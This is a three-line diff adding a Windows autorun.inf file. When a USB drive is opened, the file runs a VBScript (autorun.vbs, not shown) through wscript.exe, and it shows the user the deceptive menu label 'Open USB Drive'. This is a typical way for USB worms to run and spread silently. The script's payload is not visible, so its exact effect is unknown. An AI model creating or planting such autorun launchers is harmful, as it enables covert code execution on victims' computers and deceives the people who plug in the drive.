@@ -1,0 +1,3 @@
+[autorun]
+open=wscript.exe .\autorun.vbs
+action=Open USB Drive
